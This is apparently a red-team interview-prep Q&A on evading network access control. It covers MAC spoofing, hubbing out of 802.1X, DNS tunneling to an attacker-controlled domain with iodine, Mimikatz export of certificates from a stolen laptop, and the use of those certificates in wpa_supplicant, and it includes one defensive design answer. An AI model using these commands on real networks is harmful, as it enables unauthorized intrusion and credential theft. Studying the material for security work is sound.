---
tags: [interview, network-security, qna, scenario]
difficulty: expert
module: "Interview Prep - Network Security"
topic: "QnA - Network Module 56"
---

# Network Access Control (NAC) Evasion QnA

## Formal Technical Questions

### Q1: Detail the process of bypassing MAC Authentication Bypass (MAB) in a modern NAC environment. What are the prerequisites and limitations?
**Expert Answer:**
MAB is inherently flawed because it relies entirely on the spoofable MAC address of a device to grant network access. When a device connects to a switch port configured for MAB, the switch acts as a RADIUS client and sends the device's MAC address as both the username and password to the RADIUS server (e.g., Cisco ISE, ForeScout).
- **Prerequisites:** 
  1. Physical access to a switch port or an intermediate hub.
  2. Knowledge of a whitelisted MAC address (e.g., printers, VoIP phones, IoT devices).
- **Execution Methodology:**
  1. **Passive Reconnaissance:** The attacker must passively capture traffic on the wire without transmitting. Using a passive tap or a shark-jack device, the attacker listens for ARP broadcasts or CDP/LLDP packets.
  ```bash
  tcpdump -i eth0 -nn -e -c 100
  ```
  2. **MAC Spoofing:** Once a valid MAC is identified, the attacker disconnects the legitimate device, alters their own MAC address, and connects to the port.
  ```bash
  ifconfig eth0 down
  macchanger -m 00:11:22:33:44:55 eth0
  ifconfig eth0 up
  ```
- **Limitations:** If the port is configured with port security limiting the number of MACs, or if sticky MAC is enforced, the port may err-disable. Furthermore, MAB is often placed in a restricted VLAN (e.g., Voice VLAN or Printer VLAN), requiring the attacker to perform VLAN hopping or target specific devices within that segmented network.

### Q2: Explain the technical mechanics of "Hubbing Out" to bypass 802.1X EAP-TLS. Why does it work against certain port control configurations?
**Expert Answer:**
"Hubbing Out" is a physical NAC evasion technique used against 802.1X environments where MAB is not permitted or EAP-TLS is strictly enforced. 
- **The Concept:** 802.1X port-based access control typically authenticates a session based on the port state. Once the legitimate supplicant (the victim machine) completes the EAP-TLS handshake with the authenticator (the switch), the port state transitions from `UNAUTHORIZED` to `AUTHORIZED`.
- **The Attack:**
  1. The attacker unplugs the legitimate device and places a dumb network hub (or a switch configured to flood traffic) between the wall jack and the victim's machine.
  2. The victim machine re-authenticates via 802.1X. The port opens.
  3. The attacker connects their machine to the hub. 
- **Why it works:** In standard 802.1X deployments, if `multi-auth` or `multi-host` mode is enabled on the switchport (often required for VoIP phones with PC passthrough), the switch allows multiple MAC addresses on the port once the primary device authenticates.
- **Advanced Bridging:** If `single-host` mode is enforced, the attacker can use a transparent bridge with `ebtables` / `macvlan` to encapsulate their traffic inside the MAC address of the authenticated victim, effectively piggybacking on their session without triggering MAC limits.

## Scenario-Based Questions

### Q3: You are on a Red Team engagement. You have infiltrated a corporate lobby and found a network port. It is protected by Cisco ISE using 802.1X. You cannot find a VoIP phone to hub out. You plug in, and get an IP address, but you are placed in an isolated "Guest/Remediation" VLAN with only DNS access to the internet. How do you pivot to the internal network?
**Expert Answer:**
**Initial Assessment:** 
Being placed in a Guest or Remediation VLAN typically implies that the 802.1X authentication failed, and a fallback policy assigned the port to a restricted segment. This segment usually allows DNS for captive portal resolution and DHCP.

**Attack Path: DNS Tunneling to C2 -> VPN Pivoting**
Since direct internal routing is blocked, I must establish outbound Command and Control (C2) to my external infrastructure, and then attempt to attack the external perimeter or find internal DNS zones leaking through the resolver.
1. **Verify DNS Exfiltration:** I will attempt to resolve a custom domain under my control to ensure the internal DNS servers recursively forward queries to the internet.
   ```bash
   nslookup test.myattackerdomain.com
   ```
2. **Establish Tunnel:** I will use `Iodine` or `DNSCat2` to establish a bidirectional tunnel over UDP port 53.
   ```bash
   iodine -f -P password tunnel.myattackerdomain.com
   ```
3. **Internal Recon via DNS:** Simultaneously, I will perform reverse DNS lookups (`in-addr.arpa`) against internal IP ranges using the provided internal DNS server. Often, Remediation VLANs use the same core DNS servers as the corporate network, allowing me to map internal hostnames, domain controllers, and critical infrastructure.
4. **Targeting the Captive Portal:** If a captive portal exists, I will scan the portal's infrastructure. Captive portals often have interfaces residing on management VLANs. Exploiting a vulnerability in the portal (e.g., SSRF, default credentials) could provide a foothold into the management plane, completely bypassing the NAC policy.

### Q4: During a physical breach, you manage to steal a corporate laptop. It utilizes EAP-TLS for network access. You want to use your own attacking machine instead of the restricted corporate OS. How do you extract and utilize the 802.1X certificates?
**Expert Answer:**
**Initial Thought Process:**
EAP-TLS relies on client-side certificates. On Windows, these are stored in the user or machine certificate store, and the private keys are often non-exportable. 
**Execution Strategy:**
1. **Bypass OS Execution:** I will remove the hard drive or boot the laptop into a live Linux USB (e.g., Kali) if Secure Boot/BitLocker permits. If BitLocker is enabled, I will attempt to extract the volume master key (VMK) via TPM sniffing or DMA attacks.
2. **Extracting the Certificate:**
   Assuming OS access (e.g., local admin gained via SAM hash dumping):
   - I will use tools like `Mimikatz` with the `crypto::capi` or `crypto::cng` modules to patch the CryptoAPI in memory, making the non-exportable private keys exportable.
   ```text
   mimikatz # privilege::debug
   mimikatz # crypto::cng
   mimikatz # crypto::certificates /export
   ```
3. **Supplicant Configuration:**
   Once the `.pfx` (PKCS#12) file is extracted, I will convert it to PEM format using OpenSSL.
   ```bash
   openssl pkcs12 -in extracted.pfx -out client.pem -nodes
   ```
   I will then configure `wpa_supplicant` on my attacking machine to present this certificate to the NAC environment.
   ```text
   network={
       key_mgmt=IEEE8021X
       eap=TLS
       identity="host/corporatelaptop.domain.local"
       client_cert="/path/to/client.pem"
       private_key="/path/to/client.pem"
   }
   ```
   Running `wpa_supplicant -i eth0 -D wired -c /etc/wpa_supplicant.conf` will authenticate my attacking machine seamlessly.

## Deep-Dive Defensive Questions

### Q5: As a network security architect, how would you design a NAC deployment to mitigate "Hubbing Out" and MAC Spoofing simultaneously?
**Expert Answer:**
To systematically defeat these Layer 2 evasion techniques, a defense-in-depth approach focusing on cryptographic validation and strict port-level state machines is required.
1. **Enforce 802.1X EAP-TLS with Single-Host Mode:**
   Configure the switch ports to use `authentication host-mode single-host`. This ensures that only one MAC address is allowed per port. If a hub is used and a second MAC is detected, a security violation is triggered, and the port is err-disabled.
2. **Implement MACsec (802.1AE):**
   This is the ultimate defense against physical interception and hubbing out. MACsec encrypts the traffic on the wire between the endpoint and the switch port. Even if an attacker hubs out the connection and spoofs the MAC address, they will not possess the symmetric encryption keys derived during the EAP-TLS handshake (the MACsec Key Agreement - MKA). All injected packets will be dropped by the switch as invalid.
3. **Dynamic ARP Inspection (DAI) & IP Source Guard:**
   Bind the authenticated MAC address to the assigned IP address in the switch hardware tables. This prevents the attacker from spoofing an IP address or conducting ARP poisoning if they somehow bypass the initial MAC restriction.
4. **Device Profiling and Anomalous Behavior Detection:**
   Relying solely on MAC or Certs is insufficient. NAC solutions must continuously profile the endpoint. If a device authenticates as a "Lexmark Printer" (via MAB) but begins generating Nmap scans or HTTP traffic with a Mozilla User-Agent, the NAC should dynamically quarantine the port using Change of Authorization (CoA).

## Real-World Attack Scenario

A Red Team is tasked with breaching a heavily guarded financial institution. Physical security is tight, but the team manages to tailgate into an employee breakroom. 
1. They spot a corporate VoIP phone connected to the wall, with a PC daisy-chained to the back of the phone.
2. They unplug the PC and connect a small Raspberry Pi running a transparent bridge (using `brctl` and `ebtables`).
3. The bridge is configured to completely spoof the MAC address of the unplugged PC. It captures the initial 802.1X EAP-MD5 hashes (if weak EAP types are used) or simply lets the phone re-authenticate the port via MAB.
4. Because the switch port is configured with `host-mode multi-domain` (allowing one data MAC and one voice MAC), the switch allows the traffic.
5. The Raspberry Pi injects malicious traffic into the Data VLAN using the PC's MAC address. Since the port is authenticated, the Pi immediately begins a DHCP starvation attack against the local subnet, followed by WPAD spoofing to capture NTLMv2 hashes from internal users.
6. The breach remains completely undetected by NAC because from the switch's perspective, the legitimate PC MAC is simply generating traffic.

## ASCII Diagram

```text
================= NAC EVASION VIA TRANSPARENT BRIDGING =================

   [ Victim PC ] (Disconnected)
     MAC: AA:BB:CC
          X
          X  <-- Ethernet Unplugged
          X
  +-------------------------------------------------------+
  |                   ATTACKER HARDWARE                   |
  |                                                       |
  |  [eth1] (No IP)                         [eth0] (No IP)|
  |    |                                          |       |
  |    +---------[ Transparent Bridge br0 ]-------+       |
  |             (Spoofed MAC: AA:BB:CC)                   |
  |                        |                              |
  |              [ Routing / Attack Tools ]               |
  +-------------------------------------------------------+
                               |
                               | (Traffic indistinguishable from Victim)
                               v
                     [ Corporate Wall Jack ]
                               |
                      [ Access Switch ]
             (Port state: AUTHORIZED via 802.1x)
                               |
                       [ RADIUS / ISE ]
```

## Chaining Opportunities
- **NAC Evasion -> VLAN Hopping:** Once on an unauthenticated or voice VLAN, using Double Tagging (802.1Q) to reach native VLANs.
- **NAC Evasion -> IPv6 SLAAC Attack:** Bypassing IPv4 DHCP snooping by broadcasting malicious IPv6 Router Advertisements (RA), setting the attacker as the primary DNS server for the segment.
- **NAC Evasion -> NTLM Relay:** Gaining physical network access enables immediate LLMNR/NBT-NS poisoning and NTLM relay attacks against SMB signing-disabled hosts.

## Related Notes
- [[01 - Advanced Physical Penetration Testing]]
- [[05 - Network Impersonation Vectors]]
- [[14 - Layer 2 Attack Surface]]
- [[22 - Cryptographic Failures in EAP]]
